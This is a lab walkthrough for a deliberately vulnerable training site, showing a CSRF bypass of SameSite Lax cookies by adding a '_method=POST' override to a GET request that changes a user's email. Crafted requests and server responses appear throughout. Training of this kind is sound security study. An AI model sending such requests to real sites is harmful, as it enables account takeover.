# Lab: SameSite Lax bypass via method override [OWASP Zed Attack Proxy]

Open ZAP's browser and navigate to the lab, log in with credentials `wiener:peter` and update email address.

In the bottom pane, under __History__ tab check the `POST /my-account/change-email` request. Right-click it and select "Open/Resend with Request Editor" and notice that it doesn't use CSRF tokens in either cookies or request body:

_Request Body:_

```
email=attacker%40fakemail.com
```

Same way, check the _Response_ to `POST /login` request under __History__ and notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies:

_Set-Cookie header:_

```
Set-Cookie: session=LxZFUKZXvTn74atxTzq4FM9Y5YHk0gJZ; Expires=Thu, 24 Apr 2025 13:45:52 UTC; Secure; HttpOnly
```

As a result, the session cookie will be sent in cross-site `GET` requests, as long as they involve a top-level navigation. 

Now right click the `POST /my-account/change-email` request and select "Open in Requester Tab". On the _request_ pane's top navigation bar, there is a dropdown named "Method". Click on it and select `GET`. This will convert this `POST` request to an equivalent `GET` request. 

```
GET /my-account/change-email?email=attacker%2540fakemail.com HTTP/1.1
```

Send the request and see in the response that it only allows `POST` requests:

```
HTTP/1.1 405 Method Not Allowed
Allow: POST
```

Try overriding the method by adding the `_method` parameter to the query string:

```
GET /my-account/change-email?email=foo%40bar.com&_method=POST HTTP/1.1
```

Send the request and observe that it seems to have been accepted by the server:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 6354
```

> The rest of the flow is the same as in the [original](README.md) write-up.
